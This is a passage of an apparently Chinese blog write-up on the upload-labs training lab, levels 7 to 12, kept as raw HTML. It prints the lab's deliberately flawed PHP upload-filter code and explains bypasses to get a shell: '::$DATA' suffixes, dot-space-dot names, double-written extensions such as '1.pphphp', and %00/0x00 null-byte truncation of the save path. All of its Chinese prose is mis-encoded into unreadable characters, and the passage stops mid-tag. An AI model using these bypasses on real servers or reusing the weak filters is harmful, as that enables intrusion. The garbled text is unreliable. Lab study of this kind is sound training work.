array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111044.png" alt="image-20210903165911210"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110087.png" alt="image-20210903165934867"></p><h4 id="DATAç»•è¿‡"><a href="#DATAç»•è¿‡" class="headerlink" title="::$DATAç»•è¿‡"></a>::$DATAç»•è¿‡</h4><p>åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶åã€‚åˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€ ::$DATAâ€ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-08/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111934.png" alt="image-20210903170321326"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111677.png" alt="image-20210903170503461"></p><h4 id="ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"><a href="#ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡" class="headerlink" title="ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"></a>ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡</h4><p>é€šè¿‡<code>. .</code>æ¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-09/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">è¿™é‡Œåªè¿›è¡Œäº†ä¸€æ¬¡è¯¥ä»£ç </span><br><span class="line">æˆ‘ä»¬é€šè¿‡.php. .çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œç¬¬ä¸€æ¬¡åˆ é™¤äº†æœ€åé¢çš„ç‚¹å˜æˆ.php. ç¬¬äºŒæ¬¡å»ç©ºå˜æˆäº†.php.çš„å½¢å¼ï¼Œæ‰€ä»¥è¿˜å¯ä»¥ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111082.png" alt="image-20210903171342167"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110160.png" alt="image-20210903171405035"></p><h4 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-10/index.php</span><br></pre></td></tr></table></figure><p>å°†é»‘åå•é‡Œçš„åç¼€åæ›¿æ¢ä¸ºç©ºä¸”åªæ›¿æ¢ä¸€æ¬¡ï¼Œå› æ­¤å¯ä»¥ç”¨åŒå†™ç»•è¿‡ï¼Œå†™ä¸º1.pphphpã€‚</p><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); æ›¿æ¢ä¸ºç©º</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211111039.png" alt="image-20210903171716498"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110724.png" alt="image-20210903171734036"></p><h3 id="ç™½åå•-1"><a href="#ç™½åå•-1" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h3><h4 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="00æˆªæ–­"></a>00æˆªæ–­</h4><p>00æˆªæ–­åˆ†ä¸º%00æˆªæ–­å’Œ0x00æˆªæ–­ã€‚å½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­å­˜åœ¨ç©ºå­—ç¬¦çš„æ—¶å€™ï¼Œåœ¨è¢«è§£æçš„æ—¶å€™ä¼šå¯¼è‡´ç©ºå­—ç¬¦åé¢çš„å­—ç¬¦è¢«ä¸¢å¼ƒã€‚</p><h6 id="åˆ©ç”¨æ¡ä»¶ï¼š"><a href="#åˆ©ç”¨æ¡ä»¶ï¼š" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼š"></a>åˆ©ç”¨æ¡ä»¶ï¼š</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.åç¼€æ£€æµ‹ï¼Œåˆæ ¼åˆ™è¿›è¡Œä¸Šä¼ è·¯å¾„æ‹¼æ¥ï¼ˆç™½åå•ï¼‰</span><br><span class="line">2.æ‹¼æ¥è·¯å¾„å’Œæ–‡ä»¶åï¼Œç»„æˆæ–‡ä»¶ä¸Šä¼ è·¯å¾„</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆªæ–­æ¡ä»¶ï¼šphpç‰ˆæœ¬å°äº5.3.4ï¼Œphpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</span><br></pre></td></tr></table></figure><h6 id="åˆ©ç”¨ï¼ˆæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±è¡Œï¼‰"><a href="#åˆ©ç”¨ï¼ˆæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±è¡Œï¼‰" class="headerlink" title="åˆ©ç”¨ï¼ˆæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±è¡Œï¼‰"></a>åˆ©ç”¨ï¼ˆæ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±è¡Œï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.è·¯å¾„æ‹¼æ¥ç›´æ¥ä½¿ç”¨çš„ $file_nameè¿™ä¸ªæ–‡ä»¶åï¼Œè€Œä¸æ˜¯ $file_extå’Œå…¶ä»–ä»€ä¹ˆä¸œè¥¿æ¥æ‹¼æˆä¸€ä¸ªæ–‡ä»¶åå­—ï¼Œè¿™æ—¶æ–‡ä»¶åä¸­è¿˜æ˜¯åŒ…å«æˆªæ–­å­—ç¬¦çš„ï¼Œè·¯å¾„æ‹¼å¥½ä¹‹åå¯ä»¥è¢«æˆªæ–­æˆæƒ³è¦çš„.phpã€‚</span><br><span class="line">2.æ–‡ä»¶è·¯å¾„å¯æ§ï¼Œæ¯”å¦‚æˆ‘å¯ä»¥ä¿®æ”¹è·¯å¾„æ‹¼æ¥çš„pathæ—¶ï¼Œæ¯”å¦‚æŠ“åˆ°çš„åŒ…ä¸­å­˜åœ¨path: uploads/ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠè·¯å¾„æ„é€ æˆuploads/xxx.php%00</span><br></pre></td></tr></table></figure><h5 id="00æˆªæ–­-1"><a href="#00æˆªæ–­-1" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/qq.jpg</span><br><span class="line">www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</span><br></pre></td></tr></table></figure><p><strong>%00æˆªæ–­ GETç”¨æ³•</strong></p><p>å½“æ˜¯GETæ¥æ”¶æƒ…å†µçš„æ—¶å€™ï¼Œç›´æ¥ç”¨ %00 å°±å¯ä»¥äº†ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110731.png" alt="image-20210903173641511"></p><p>æŸäº›æƒ…å†µä¸‹ï¼Œç›´æ¥åœ¨æ–‡ä»¶åä¸­åŠ  %00 è¿›è¡Œæˆªæ–­è¿™æ˜¯ä¸å¯¹çš„ï¼Œå› ä¸º %00 ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è§£æäº†ã€‚</p><p>å¦‚æœæ²¡æœ‰åšåç¼€ååˆ¤æ–­çš„æƒ…å†µä¸‹ï¼Œé‚£æ ·ä¼šå˜æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php%00.jpg</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯æ‰€è°“çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´äº†ï¼Œè¿™åˆæ˜¯å¦ä¸€ä¸ªæ¦‚å¿µäº†ã€‚</p><p><strong>%00æˆªæ–­ POST ç”¨æ³•</strong></p><p>å½“æ˜¯POSTæ¥æ”¶æƒ…å†µçš„æ—¶å€™ï¼Œæ­£ç¡®çš„ç”¨æ³•åº”è¯¥æ˜¯æˆ‘ä»¬éœ€è¦å¯¹ %00 åšä¸€ä¸ªURLè§£ç ï¼Œä¹Ÿå°±æ˜¯URL-decodeï¼›</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112756.png" alt="image-20210903173834255" style="zoom:50%;" /><p>ä¸ºä»€ä¹ˆä¸¤è€…ç”¨æ³•ä¸åŒï¼Ÿ</p><p>è¿™æ˜¯å› ä¸º %00 æˆªæ–­åœ¨ GET ä¸­è¢« url è§£ç ä¹‹åæ˜¯ç©ºå­—ç¬¦ã€‚ä½†æ˜¯åœ¨ POST ä¸­ %00 ä¸ä¼šè¢« url è§£ç ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ burpsuite ä¿®æ”¹ hex å€¼ä¸º 00 ï¼ˆURL decodeï¼‰è¿›è¡Œæˆªæ–­ã€‚</p><p>æ³¨æ„ï¼š</p><p>æœ‰äº›æ—¶å€™æ•°æ®åŒ…ä¸­å¿…é¡»å«æœ‰<strong>ä¸Šä¼ æ–‡ä»¶åçš„ç›®å½•</strong>æƒ…å†µæ‰å¯ä»¥ç”¨ã€‚</p><p>ä¾‹å¦‚ï¼šæ•°æ®åŒ…ä¸­å­˜åœ¨ path: uploads/ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹pathçš„å€¼æ¥æ„é€ paylod: uploads/aa.php%00</p><p>åƒä»¥ä¸‹è¿™ä¸ªPHPæ–‡ä»¶ä¸Šä¼ æ£€æµ‹ä»£ç ï¼Œè¿™ä¸ªå°±éœ€è¦æœ‰ä¸Šä¼ æ–‡ä»¶åçš„ç›®å½•æ‰èƒ½ç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_name = $_FILES[ &#x27;file&#x27; ][ &#x27;name&#x27; ];</span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); // æå–ä¸Šä¼ æ–‡ä»¶åç¼€</span><br><span class="line">$target_name = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œé‡å‘½å</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; )) </span><br><span class="line">&#123;  </span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">    $dir . $target_name); // å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•</span><br><span class="line">    $result = $dir . $target_name;</span><br><span class="line">    echo &quot;Stored in: $result&quot;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;Invalid file&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¿®æ”¹pathæ‰å¯ä»¥ï¼Ÿ</p><p>å› ä¸ºç¨‹åºä¸­æ£€æµ‹çš„æ˜¯æ–‡ä»¶çš„åç¼€åï¼Œå¦‚æœåç¼€åˆæ³•åˆ™æ‹¼æ¥è·¯å¾„å’Œæ–‡ä»¶åã€‚</p><p>é‚£ä¹ˆï¼Œæ”»å‡»è€…ä¿®æ”¹äº†pathä»¥åçš„æ‹¼æ¥ç»“æœä¸ºï¼šuploads/aaa.php%00/20190818.php</p><p>ç§»åŠ¨æ–‡ä»¶çš„æ—¶å€™ä¼šå°†æ–‡ä»¶ä¿å­˜ä¸ºï¼šuploads/aaa.php</p><p>ä»è€Œè¾¾åˆ°Getshellæ•ˆæœã€‚</p><p><strong>ä¾‹å­</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-11/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211110729.png" alt="image-20210903174814005"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112535.png" alt="image-20210903174920812"></p><h5 id="0x00æˆªæ–­"><a href="#0x00æˆªæ–­" class="headerlink" title="0x00æˆªæ–­"></a>0x00æˆªæ–­</h5><p>å®ƒä»¬æœ€ç»ˆçš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½ä»£è¡¨ç€chr(0)ï¼Œå³ç©ºå­—ç¬¦ï¼Œåªä¸è¿‡ä½¿ç”¨çš„ä½ç½®ä¸åŒï¼Œ0x00ä»£è¡¨16è¿›åˆ¶çš„ç©ºå­—ç¬¦00ï¼Œéœ€è¦åœ¨HEXä¸­æ”¹ä¸º00ï¼Œè¿›è¡Œæˆªæ–­ï¼Œè€Œ%00æ˜¯URLè§£ç ä¹‹å‰çš„å­—ç¬¦ï¼Œå®ƒè¢«è§£ç æˆ16è¿›åˆ¶ASCIIç ä¹‹åå®é™…ä¸Šä¹Ÿæ˜¯0x00ï¼Œæ‰€ä»¥å®ƒä»¬æœ€ç»ˆéƒ½å¯¹åº”çš„æ˜¯ç©ºå­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-12/index.php</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹ä»£ç </strong></p><figure 